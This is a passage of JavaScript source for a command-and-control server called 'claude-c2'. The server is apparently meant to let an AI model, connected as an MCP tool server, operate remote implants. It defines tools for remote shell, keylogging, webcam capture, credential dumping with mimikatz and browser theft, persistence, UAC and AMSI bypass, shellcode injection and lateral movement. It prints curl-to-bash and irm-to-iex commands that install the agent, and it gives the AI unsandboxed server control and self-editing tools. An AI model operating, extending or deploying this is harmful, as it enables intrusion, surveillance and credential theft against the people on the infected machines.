import 'dotenv/config';
import express from 'express';
import { WebSocketServer, WebSocket } from 'ws';
import { randomBytes, createHash } from 'crypto';
import { v4 as uuidv4 } from 'uuid';
import fs from 'fs';
import { exec } from 'child_process';
import { promisify } from 'util';
import os from 'os';
import path from 'path';

const execAsync = promisify(exec);

// Load config
const config = {
  port: process.env.PORT || 3100,
  wsPort: process.env.WS_PORT || 3101,
  jwtSecret: process.env.JWT_SECRET || randomBytes(32).toString('hex'),
  oauthClientId: process.env.OAUTH_CLIENT_ID || randomBytes(16).toString('hex'),
  oauthClientSecret: process.env.OAUTH_CLIENT_SECRET || randomBytes(32).toString('hex'),
  clientAuthSecret: process.env.CLIENT_AUTH_SECRET || randomBytes(24).toString('hex'),
  serverUrl: process.env.SERVER_URL || 'https://localhost',
};

// Extract domain from SERVER_URL for payload substitution
const DOMAIN = config.serverUrl.replace(/^https?:\/\//, '');


// Logging
const log = (msg) => {
  const line = `${msg}`;
  console.log(line);
  fs.appendFileSync('logs/server.log', line + '\n');
};

// Client manager
class ClientManager {
  constructor() {
    this.clients = new Map();
    this.pendingCommands = new Map();
    this.commandHistory = new Map();
  }

  register(clientId, ws, info) {
    this.clients.set(clientId, { ws, info, lastSeen: new Date(), status: 'online' });
  }

  unregister(clientId) {
    this.clients.delete(clientId);
  }

  getActiveClients() {
    const active = [];
    for (const [id, client] of this.clients) {
      if (client.ws?.readyState === WebSocket.OPEN) {
        active.push({ id, info: client.info, lastSeen: client.lastSeen.toISOString(), status: client.status });
      }
    }
    return active;
  }

  async sendCommand(clientId, command, args = {}, timeout = 30000) {
    const client = this.clients.get(clientId);
    if (!client || client.ws?.readyState !== WebSocket.OPEN) {
      throw new Error(`Client ${clientId} is not connected`);
    }
    const commandId = uuidv4();
    const message = { type: 'command', commandId, command, args, timestamp: new Date().toISOString() };
    return new Promise((resolve, reject) => {
      const timeoutId = setTimeout(() => {
        this.pendingCommands.delete(commandId);
        reject(new Error(`Command timeout after ${timeout}ms`));
      }, timeout);
      this.pendingCommands.set(commandId, { resolve, reject, timeoutId });
      client.ws.send(JSON.stringify(message));
      log(`[ClientManager] Sent command ${command} to ${clientId} (${commandId})`);
    });
  }

  handleCommandResponse(commandId, result) {
    const pending = this.pendingCommands.get(commandId);
    if (pending) {
      clearTimeout(pending.timeoutId);
      this.pendingCommands.delete(commandId);
      pending.resolve(result);
    }
  }

  addToHistory(clientId, entry) {
    if (!this.commandHistory.has(clientId)) this.commandHistory.set(clientId, []);
    const history = this.commandHistory.get(clientId);
    history.push({ ...entry, timestamp: new Date().toISOString() });
    if (history.length > 100) history.shift();
  }

  getHistory(clientId, limit = 20) {
    return (this.commandHistory.get(clientId) || []).slice(-limit);
  }
}

const clientManager = new ClientManager();

// OAuth state storage
const oauthStates = new Map();
const authCodes = new Map();
const accessTokens = new Map();

// Express app
const app = express();
app.use(express.json());

// CORS
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

// OAuth endpoints
app.get('/oauth/authorize', (req, res) => {
  const { client_id, redirect_uri, state, response_type, code_challenge, code_challenge_method } = req.query;
  if (client_id !== config.oauthClientId) return res.status(400).send('Invalid client_id');
  const code = randomBytes(32).toString('hex');
  authCodes.set(code, { redirect_uri, state, code_challenge, code_challenge_method, createdAt: Date.now() });
  setTimeout(() => authCodes.delete(code), 600000);
  const redirectUrl = new URL(redirect_uri);
  redirectUrl.searchParams.set('code', code);
  if (state) redirectUrl.searchParams.set('state', state);
  res.redirect(redirectUrl.toString());
});

app.post('/oauth/token', (req, res) => {
  const { grant_type, code, redirect_uri, client_id, client_secret, code_verifier } = req.body;
  if (grant_type !== 'authorization_code') return res.status(400).json({ error: 'unsupported_grant_type' });
  const authCode = authCodes.get(code);
  if (!authCode) return res.status(400).json({ error: 'invalid_grant' });
  if (authCode.code_challenge && code_verifier) {
    const hash = createHash('sha256').update(code_verifier).digest('base64url');
    if (hash !== authCode.code_challenge) return res.status(400).json({ error: 'invalid_grant' });
  }
  authCodes.delete(code);
  const accessToken = randomBytes(32).toString('hex');
  accessTokens.set(accessToken, { clientId: client_id, createdAt: Date.now() });
  res.json({ access_token: accessToken, token_type: 'Bearer', expires_in: 3600 });
});

// MCP SSE endpoint - GET for SSE stream
app.get('/mcp/sse', async (req, res) => {
  log('[MCP] SSE GET connection from ' + req.ip);
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders();

  const sessionId = uuidv4();
  res.write(`data: ${JSON.stringify({ type: 'session_start', sessionId })}\n\n`);

  const keepAlive = setInterval(() => res.write(': keepalive\n\n'), 30000);
  req.on('close', () => {
    clearInterval(keepAlive);
    log('[MCP] SSE connection closed');
  });
});

// MCP SSE endpoint - POST for messages (Claude connector uses this)
app.post('/mcp/sse', async (req, res) => {
  log('[MCP] SSE POST from ' + req.ip + ': ' + JSON.stringify(req.body));
  const { method, params, id } = req.body;

  try {
    let result;

    if (method === 'initialize') {
      result = {
        protocolVersion: '2024-11-05',
        capabilities: { tools: {} },
        serverInfo: { name: 'claude-c2', version: '1.0.0' }
      };
    } else if (method === 'tools/list') {
      result = {
        tools: [
          // === CLIENT MANAGEMENT ===
          { name: 'list_clients', description: 'List all connected remote clients/implants', inputSchema: { type: 'object', properties: {} } },
          { name: 'client_info', description: 'Get detailed info about a specific client', inputSchema: { type: 'object', properties: { client_id: { type: 'string' } }, required: ['client_id'] } },

          // === EXECUTION ===
          { name: 'shell', description: 'Execute shell command on remote client (cmd.exe on Windows, /bin/sh on Linux). If only one client connected, client_id is auto-selected.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Target client (optional if only one connected)' }, cmd: { type: 'string', description: 'Command to execute' } }, required: ['cmd'] } },
          { name: 'powershell', description: 'Execute PowerShell command on Windows client. Auto-selects client if only one connected.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Target client (optional if only one connected)' }, cmd: { type: 'string', description: 'PowerShell command' }, bypass_amsi: { type: 'boolean', description: 'Attempt AMSI bypass first' } }, required: ['cmd'] } },
          { name: 'execute_assembly', description: 'Load and execute .NET assembly in memory. Auto-selects client if only one connected.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Target client (optional if only one connected)' }, assembly_b64: { type: 'string', description: 'Base64 encoded .NET assembly' }, args: { type: 'string', description: 'Arguments to pass' } }, required: ['assembly_b64'] } },

          // === RECONNAISSANCE (all auto-select client if only one connected) ===
          { name: 'sysinfo', description: 'Get system info (OS, hardware, domain). Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional - auto-selects if one client' } } } },
          { name: 'netinfo', description: 'Get network config (IPs, routes, connections). Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
          { name: 'pslist', description: 'List running processes. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
          { name: 'services', description: 'List Windows services. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, filter: { type: 'string', description: 'Filter by name' } } } },
          { name: 'installed_software', description: 'List installed programs. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
          { name: 'scheduled_tasks', description: 'List scheduled tasks. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
          { name: 'startup_programs', description: 'List startup programs. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
          { name: 'domain_info', description: 'Get AD domain info. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
          { name: 'local_users', description: 'List local users/groups. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
          { name: 'shares', description: 'List network shares. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, target: { type: 'string', description: 'Remote host (optional)' } } } },

          // === FILE OPERATIONS (all auto-select client) ===
          { name: 'ls', description: 'List directory. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, path: { type: 'string', description: 'Directory path (default: current)' } } } },
          { name: 'cat', description: 'Read file contents. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, path: { type: 'string' } }, required: ['path'] } },
          { name: 'write', description: 'Write to file. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, path: { type: 'string' }, content: { type: 'string' } }, required: ['path', 'content'] } },
          { name: 'download', description: 'Download file from client to C2. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, remote_path: { type: 'string' }, local_path: { type: 'string', description: 'Save path on C2 (optional)' } }, required: ['remote_path'] } },
          { name: 'upload', description: 'Upload file to client. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, local_path: { type: 'string', description: 'Path on C2' }, remote_path: { type: 'string' } }, required: ['local_path', 'remote_path'] } },
          { name: 'rm', description: 'Delete file/directory. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, path: { type: 'string' }, recursive: { type: 'boolean' } }, required: ['path'] } },
          { name: 'mkdir', description: 'Create directory. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, path: { type: 'string' } }, required: ['path'] } },
          { name: 'cp', description: 'Copy file. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, src: { type: 'string' }, dst: { type: 'string' } }, required: ['src', 'dst'] } },
          { name: 'mv', description: 'Move/rename file. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, src: { type: 'string' }, dst: { type: 'string' } }, required: ['src', 'dst'] } },
          { name: 'search', description: 'Search files by pattern. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, path: { type: 'string' }, pattern: { type: 'string', description: 'Pattern (e.g., *.docx, *password*)' }, recursive: { type: 'boolean' } }, required: ['pattern'] } },
          { name: 'zip', description: 'Compress to zip. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, src: { type: 'string' }, dst: { type: 'string' } }, required: ['src', 'dst'] } },

          // === SURVEILLANCE (all auto-select client) ===
          { name: 'screenshot', description: 'Take screenshot. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
          { name: 'webcam', description: 'Capture webcam photo. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
          { name: 'keylog_start', description: 'Start keylogger. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
          { name: 'keylog_dump', description: 'Get captured keystrokes. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
          { name: 'keylog_stop', description: 'Stop keylogger. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
          { name: 'clipboard', description: 'Get clipboard contents. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },

          // === CREDENTIAL ACCESS (all auto-select client) ===
          { name: 'hashdump', description: 'Dump password hashes (requires admin). Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
          { name: 'mimikatz', description: 'Run Mimikatz command. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, cmd: { type: 'string', description: 'Mimikatz command (e.g., sekurlsa::logonpasswords)' } }, required: ['cmd'] } },
          { name: 'browser_creds', description: 'Extract browser passwords. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, browser: { type: 'string', description: 'chrome, firefox, edge, or all' } } } },
          { name: 'wifi_passwords', description: 'Get saved WiFi passwords. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
          { name: 'vault_creds', description: 'Get Windows Vault credentials. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },

          // === PERSISTENCE (auto-select client) ===
          { name: 'persist_registry', description: 'Registry run key persistence. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, name: { type: 'string' }, command: { type: 'string' }, hive: { type: 'string', description: 'HKCU or HKLM' } }, required: ['name', 'command'] } },
          { name: 'persist_schtask', description: 'Scheduled task persistence. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, name: { type: 'string' }, command: { type: 'string' }, trigger: { type: 'string', description: 'onlogon, daily, hourly' } }, required: ['name', 'command'] } },
          { name: 'persist_service', description: 'Install as Windows service. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, name: { type: 'string' }, binary_path: { type: 'string' } }, required: ['name', 'binary_path'] } },
          { name: 'persist_startup', description: 'Add to startup folder. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, name: { type: 'string' }, command: { type: 'string' } }, required: ['name', 'command'] } },
          { name: 'persist_wmi', description: 'WMI event subscription persistence. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, name: { type: 'string' }, command: { type: 'string' } }, required: ['name', 'command'] } },
          { name: 'persist_list', description: 'List persistence mechanisms. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
          { name: 'persist_remove', description: 'Remove persistence. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, type: { type: 'string', description: 'registry, schtask, service, startup, wmi' }, name: { type: 'string' } }, required: ['type', 'name'] } },

          // === PRIVILEGE ESCALATION (auto-select client) ===
          { name: 'privesc_check', description: 'Check privesc vectors. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
          { name: 'getsystem', description: 'Get SYSTEM privileges. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, technique: { type: 'string', description: 'token, pipe, or auto' } } } },
          { name: 'runas', description: 'Run as different user. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, user: { type: 'string' }, password: { type: 'string' }, domain: { type: 'string' }, cmd: { type: 'string' } }, required: ['user', 'password', 'cmd'] } },
          { name: 'bypassuac', description: 'UAC bypass. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, technique: { type: 'string', description: 'fodhelper, eventvwr, sdclt, auto' } } } },

          // === LATERAL MOVEMENT (auto-select client) ===
          { name: 'portscan', description: 'Port scan target. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, target: { type: 'string' }, ports: { type: 'string', description: 'Ports (e.g., 22,80,443 or 1-1000)' } }, required: ['target', 'ports'] } },
          { name: 'netscan', description: 'Scan network for hosts. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, subnet: { type: 'string', description: 'e.g., 192.168.1.0/24' } }, required: ['subnet'] } },
          { name: 'psexec', description: 'PsExec remote execution. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, target: { type: 'string' }, user: { type: 'string' }, password: { type: 'string' }, cmd: { type: 'string' } }, required: ['target', 'cmd'] } },
          { name: 'wmiexec', description: 'WMI remote execution. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, target: { type: 'string' }, user: { type: 'string' }, password: { type: 'string' }, cmd: { type: 'string' } }, required: ['target', 'cmd'] } },
          { name: 'winrm', description: 'WinRM remote execution. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, target: { type: 'string' }, user: { type: 'string' }, password: { type: 'string' }, cmd: { type: 'string' } }, required: ['target', 'cmd'] } },
          { name: 'ssh_exec', description: 'SSH remote execution. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, target: { type: 'string' }, user: { type: 'string' }, password: { type: 'string' }, key: { type: 'string' }, cmd: { type: 'string' } }, required: ['target', 'user', 'cmd'] } },

          // === DEFENSE EVASION (auto-select client) ===
          { name: 'amsi_bypass', description: 'Bypass AMSI. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
          { name: 'etw_patch', description: 'Patch ETW logging. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
          { name: 'defender_exclude', description: 'Add Defender exclusion. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, path: { type: 'string' } }, required: ['path'] } },
          { name: 'defender_status', description: 'Get Defender status. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
          { name: 'firewall_status', description: 'Get firewall status. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
          { name: 'firewall_rule', description: 'Manage firewall rule. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, action: { type: 'string', description: 'add or remove' }, name: { type: 'string' }, port: { type: 'number' }, protocol: { type: 'string' } }, required: ['action', 'name'] } },
          { name: 'timestomp', description: 'Modify file timestamps. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, path: { type: 'string' }, reference: { type: 'string', description: 'Reference file' } }, required: ['path'] } },

          // === PROCESS OPERATIONS (auto-select client) ===
          { name: 'ps', description: 'List processes. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
          { name: 'kill', description: 'Kill process. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, pid: { type: 'number' }, name: { type: 'string' } } } },
          { name: 'inject', description: 'Inject shellcode. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, pid: { type: 'number' }, shellcode_b64: { type: 'string' } }, required: ['pid', 'shellcode_b64'] } },
          { name: 'spawn', description: 'Spawn process. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, path: { type: 'string' }, args: { type: 'string' }, hidden: { type: 'boolean' } }, required: ['path'] } },

          // === REGISTRY - Windows (auto-select client) ===
          { name: 'reg_read', description: 'Read registry value. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, path: { type: 'string' }, name: { type: 'string' } }, required: ['path'] } },
          { name: 'reg_write', description: 'Write registry value. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, path: { type: 'string' }, name: { type: 'string' }, value: { type: 'string' }, type: { type: 'string', description: 'REG_SZ, REG_DWORD' } }, required: ['path', 'name', 'value'] } },
          { name: 'reg_delete', description: 'Delete registry key/value. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, path: { type: 'string' }, name: { type: 'string' } }, required: ['path'] } },

          // === C2 SERVER TOOLS (run directly on VPS, no sandbox) ===
          { name: 'server_shell', description: 'Execute any shell command on C2 server (bash, no sandbox, full permissions). Use sudo for privileged ops.', inputSchema: { type: 'object', properties: { command: { type: 'string', description: 'Shell command to run' }, cwd: { type: 'string', description: 'Working directory' }, timeout: { type: 'number', description: 'Timeout in ms (default 120000)' } }, required: ['command'] } },
          { name: 'server_file_read', description: 'Read any file from C2 server', inputSchema: { type: 'object', properties: { path: { type: 'string', description: 'Absolute or relative path' } }, required: ['path'] } },
          { name: 'server_file_write', description: 'Write file to C2 server (auto-creates parent dirs)', inputSchema: { type: 'object', properties: { path: { type: 'string', description: 'File path' }, content: { type: 'string', description: 'File content' } }, required: ['path', 'content'] } },
          { name: 'server_file_list', description: 'List directory on C2 server', inputSchema: { type: 'object', properties: { path: { type: 'string', description: 'Directory path (default: cwd)' } } } },
          { name: 'server_info', description: 'Get C2 server system info', inputSchema: { type: 'object', properties: {} } },

          // === MCP SELF-EDIT TOOLS ===
          { name: 'mcp_read_source', description: 'Read MCP server source code files', inputSchema: { type: 'object', properties: { file: { type: 'string', description: 'Filename: server.js, or path relative to project root' } }, required: ['file'] } },
          { name: 'mcp_edit_code', description: 'Edit MCP server code using find/replace', inputSchema: { type: 'object', properties: { file: { type: 'string', description: 'File to edit (e.g., src/server.js)' }, find: { type: 'string', description: 'Text to find (exact match)' }, replace: { type: 'string', description: 'Text to replace with' } }, required: ['file', 'find', 'replace'] } },
          { name: 'mcp_write_file', description: 'Write/overwrite entire file in MCP project', inputSchema: { type: 'object', properties: { file: { type: 'string', description: 'File path relative to project root' }, content: { type: 'string', description: 'Complete file content' } }, required: ['file', 'content'] } },
          { name: 'mcp_append_code', description: 'Append code to MCP server file', inputSchema: { type: 'object', properties: { file: { type: 'string' }, code: { type: 'string', description: 'Code to append' }, before: { type: 'string', description: 'Insert before this text (optional)' } }, required: ['file', 'code'] } },
          { name: 'mcp_list_source', description: 'List all source files in MCP project', inputSchema: { type: 'object', properties: { path: { type: 'string', description: 'Subdirectory (optional)' } } } },
          { name: 'mcp_restart', description: 'Restart the MCP server to apply code changes', inputSchema: { type: 'object', properties: { delay: { type: 'number', description: 'Delay in seconds before restart (default: 2)' } } } },
          { name: 'mcp_backup', description: 'Backup MCP server files before editing', inputSchema: { type: 'object', properties: { files: { type: 'array', description: 'Files to backup (default: all source files)' } } } },
          { name: 'mcp_restore', description: 'Restore MCP server from backup', inputSchema: { type: 'object', properties: { backup_id: { type: 'string', description: 'Backup ID (timestamp)' } }, required: ['backup_id'] } },
          { name: 'mcp_logs', description: 'Get MCP server logs', inputSchema: { type: 'object', properties: { lines: { type: 'number', description: 'Number of lines (default: 50)' }, filter: { type: 'string', description: 'Filter pattern (optional)' } } } },
          { name: 'mcp_add_tool', description: 'Add a new MCP tool dynamically (adds to tools list and handler)', inputSchema: { type: 'object', properties: { name: { type: 'string', description: 'Tool name' }, description: { type: 'string', description: 'Tool description' }, handler_code: { type: 'string', description: 'JavaScript handler code for the tool' }, input_schema: { type: 'object', description: 'JSON schema for input parameters' } }, required: ['name', 'description', 'handler_code'] } },
          { name: 'mcp_config', description: 'Read or update MCP server configuration', inputSchema: { type: 'object', properties: { action: { type: 'string', description: 'get or set' }, key: { type: 'string' }, value: { type: 'string' } }, required: ['action'] } },

          // === HELP & DOCUMENTATION ===
          { name: 'help', description: 'Get help about Claude C2 - shows available commands, usage, and documentation', inputSchema: { type: 'object', properties: { topic: { type: 'string', description: 'Topic: overview, tools, agents, architecture, api, examples, or specific tool name' } } } },
          { name: 'project_info', description: 'Get complete project structure, architecture, and codebase knowledge for making modifications', inputSchema: { type: 'object', properties: {} } },
          { name: 'tool_docs', description: 'Get detailed documentation for a specific tool or category', inputSchema: { type: 'object', properties: { tool: { type: 'string', description: 'Tool name or category (execution, recon, files, creds, persist, privesc, lateral, evasion, surveillance)' } }, required: ['tool'] } },

          // === PAYLOAD GENERATION ===
          { name: 'get_payload', description: 'Get agent payload/implant for a specific platform', inputSchema: { type: 'object', properties: { platform: { type: 'string', description: 'Platform: windows, linux, macos, termux, python' }, format: { type: 'string', description: 'Format: oneliner, script, or encoded' }, custom_id: { type: 'string', description: 'Custom client ID (optional)' } }, required: ['platform'] } },
          { name: 'generate_payload', description: 'Generate customized payload with specific options', inputSchema: { type: 'object', properties: { platform: { type: 'string', description: 'windows, linux, macos, termux' }, options: { type: 'object', description: 'Custom options: {id, server, persistence, hidden, autostart}' } }, required: ['platform'] } },
          { name: 'list_payloads', description: 'List all available payload types and platforms', inputSchema: { type: 'object', properties: {} } },

          // === LOOT MANAGEMENT ===
          { name: 'loot_list', description: 'List collected loot/exfiltrated data', inputSchema: { type: 'object', properties: {} } },
          { name: 'loot_download', description: 'Download loot file', inputSchema: { type: 'object', properties: { filename: { type: 'string' } }, required: ['filename'] } },
        ]
      };
    } else if (method === 'tools/call') {
      const { name, arguments: args } = params;
      const lootDir = '/home/iozac/loot';
      const screenshotDir = '/home/iozac/screenshots';
      const downloadDir = '/home/iozac/downloads';

      // Smart helper: Auto-select client if only one connected
      const getClientId = () => {
        if (args.client_id) return args.client_id;
        const clients = clientManager.getActiveClients();
        if (clients.length === 1) return clients[0].id;
        if (clients.length === 0) return null;
        return null; // Multiple clients, need explicit selection
      };

      // Helper to send command to client with smart selection
      const sendCmd = async (cmd, cmdArgs = {}, timeout = 60000) => {
        const clientId = getClientId();
        if (!clientId) {
          const clients = clientManager.getActiveClients();
          if (clients.length === 0) {
            throw new Error('No clients connected. Deploy an agent first: use get_payload tool or visit /agents page.');
          } else {
            throw new Error(`Multiple clients connected (${clients.map(c => c.id).join(', ')}). Please specify client_id parameter.`);
          }
        }
        return await clientManager.sendCommand(clientId, cmd, cmdArgs, timeout);
      };

      // Get resolved client ID for responses
      const resolvedClientId = getClientId();

      // Helper to save loot
      const saveLoot = (filename, data) => {
        if (!fs.existsSync(lootDir)) fs.mkdirSync(lootDir, { recursive: true });
        const filepath = path.join(lootDir, filename);
        fs.writeFileSync(filepath, typeof data === 'string' ? data : JSON.stringify(data, null, 2));
        return filepath;
      };

      // === CLIENT MANAGEMENT ===
      if (name === 'list_clients') {
        const clients = clientManager.getActiveClients();
        if (clients.length === 0) {
          result = { content: [{ type: 'text', text: JSON.stringify({
            success: true,
            clients: [],
            message: 'No clients connected.',
            hint: 'Deploy an agent using one of these methods:',
            deployment: {
              windows: 'irm https://${DOMAIN}/agent/windows | iex',
              linux: 'curl -s https://${DOMAIN}/agent/linux | bash',
              termux: 'curl -s https://${DOMAIN}/agent/termux | bash',
              python: 'curl -s https://${DOMAIN}/agent/python -o a.py && python3 a.py'
            },
            tools: 'Use get_payload or list_payloads for more options'
          }, null, 2) }] };
        } else {
          result = { content: [{ type: 'text', text: JSON.stringify({
            success: true,
            count: clients.length,
            clients,
            hint: clients.length === 1 ? `Only one client connected (${clients[0].id}). You can omit client_id in commands - it will auto-select.` : 'Specify client_id when running commands.'
          }, null, 2) }] };
        }
      } else if (name === 'client_info') {
        const clientId = getClientId() || args.client_id;
        const clients = clientManager.getActiveClients();
        const client = clients.find(c => c.id === clientId);
        if (client) {
          result = { content: [{ type: 'text', text: JSON.stringify({ success: true, ...client }, null, 2) }] };
        } else {
          result = { content: [{ type: 'text', text: JSON.stringify({
            success: false,
            error: 'Client not found',
            available_clients: clients.map(c => c.id),
            hint: clients.length > 0 ? `Available clients: ${clients.map(c => c.id).join(', ')}` : 'No clients connected. Use list_clients for deployment instructions.'
          }, null, 2) }] };
        }
      }

      // === EXECUTION ===
      else if (name === 'shell') {
        const usedClientId = getClientId();
        const cmdResult = await sendCmd('shell', { cmd: args.cmd });
        result = { content: [{ type: 'text', text: JSON.stringify({ ...cmdResult, client: usedClientId, command: args.cmd }, null, 2) }] };
      } else if (name === 'powershell') {
        const usedClientId = getClientId();
        const cmdResult = await sendCmd('powershell', { cmd: args.cmd, bypass_amsi: args.bypass_amsi });
        result = { content: [{ type: 'text', text: JSON.stringify({ ...cmdResult, client: usedClientId }, null, 2) }] };
      } else if (name === 'execute_assembly') {
        const usedClientId = getClientId();
        const cmdResult = await sendCmd('execute_assembly', { assembly_b64: args.assembly_b64, args: args.args }, 120000);
        result = { content: [{ type: 'text', text: JSON.stringify({ ...cmdResult, client: usedClientId }, null, 2) }] };
      }

      // === RECONNAISSANCE ===
      else if (name === 'sysinfo') {
        const cmdResult = await sendCmd('sysinfo', {});
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'netinfo') {
        const cmdResult = await sendCmd('netinfo', {});
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'pslist' || name === 'ps') {
        const cmdResult = await sendCmd('pslist', {});
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'services') {
        const cmdResult = await sendCmd('services', { filter: args.filter });
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'installed_software') {
        const cmdResult = await sendCmd('installed_software', {});
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'scheduled_tasks') {
        const cmdResult = await sendCmd('scheduled_tasks', {});
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'startup_programs') {
        const cmdResult = await sendCmd('startup_programs', {});
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'domain_info') {
        const cmdResult = await sendCmd('domain_info', {});
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'local_users') {
        const cmdResult = await sendCmd('local_users', {});
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      } else if (name === 'shares') {
        const cmdResult = await sendCmd('shares', { target: args.target });
        result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
      }

      // === FILE OPERATIONS ===
      else if (name === 'ls') {
